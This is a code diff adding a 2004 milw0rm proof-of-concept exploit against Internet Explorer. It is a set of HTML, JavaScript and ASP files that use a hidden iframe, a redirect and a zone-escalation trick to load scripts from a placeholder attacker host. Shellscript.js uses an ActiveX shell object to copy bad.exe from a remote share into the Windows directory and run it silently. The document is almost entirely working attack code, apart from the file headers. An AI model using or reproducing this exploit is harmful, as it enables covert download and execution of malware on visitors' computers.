@@ -1,0 +1,74 @@
+-----------------------------------------------------  default.htm  -------------------------------------------------------
+<html>
+<body>
+<img src="cc.exe" width=0 height=0 style=display:none>
+
+<script language="Javascript">
+
+function InjectedDuringRedirection(){
+showModalDialog('md.htm',window,"dialogTop:-1000\;dialogLeft:-1000\;dialogHeight:1\;dialogWidth:1\;").
+location="vbscript:\"<SCRIPT SRC='http://IPADDRESS/shellscript_loader.js'><\/script>\"";
+}
+
+</script>
+
+<script language="javascript">
+
+setTimeout("myiframe.execScript(InjectedDuringRedirection.toString())",100);
+setTimeout("myiframe.execScript('InjectedDuringRedirection()') ",101);
+document.write('<IFRAME ID=myiframe NAME=myiframe SRC="redir.asp" style=display:none;></IFRAME>');
+
+</script>
+
+</body>
+</html>
+
+--------------------------------------------------------- md.htm  ---------------------------------------------------------
+<SCRIPT language="javascript">
+
+window.returnValue = window.dialogArguments;
+
+function CheckStatus(){
+try{tempVar=window.dialogArguments.location.href;}catch(e){window.close();}
+setTimeout("CheckStatus()",100);
+}
+
+CheckStatus();
+
+</SCRIPT>
+
+--------------------------------------------------- shellscript_loader.js  ---------------------------------------------------
+function getRealShell() {
+myiframe.document.write("<SCRIPT SRC='http://IPADDRESS/shellscript.js'><\/SCRIPT>");
+}
+
+document.write("<IFRAME ID=myiframe SRC='about:blank' WIDTH=200 HEIGHT=200></IFRAME>");
+setTimeout("getRealShell()",100);
+
+------------------------------------------------------- shellscript.js  -------------------------------------------------------
+function injectIt() {
+document.frames[0].document.body.insertAdjacentHTML('afterBegin','injected<script language="JScript" DEFER>
+var rF="\\\\\\\\IPADDRESS\\\\NULLSHAREDFOLDER\\\\bad.exe";var wF="%windir%\\\\_tmp.exe";var 
+o=new ActiveXObject("wscript.shell");var e="%comspec% /c copy "+rF+" "+wF;var err=o.Run(e,0,true);if(err==0)
+o.Run(wF,0,false);</script>');
+}
+document.write('<iframe src="shell:WINDOWS\\Web\\TIP.HTM"></iframe>');
+setTimeout("injectIt()", 1000);
+--------------------------------------------------------- redir.asp  ----------------------------------------------------------
+<%
+Response.Expires = 1
+Response.Expiresabsolute = Now() - 1
+Response.AddHeader "pragma","no-cache"
+Response.AddHeader "cache-control","private"
+Response.CacheControl = "no-cache"
+For x = 1 to 500000 'Time
+z = z + 10
+Next
+
+Response.Status = "302 Found" 
+Response.AddHeader "Content-Length", "4"
+Response.AddHeader "Location","URL:res://shdoclc.dll/HTTP_501.htm"
+%>
+
+
+# milw0rm.com [2004-07-13]
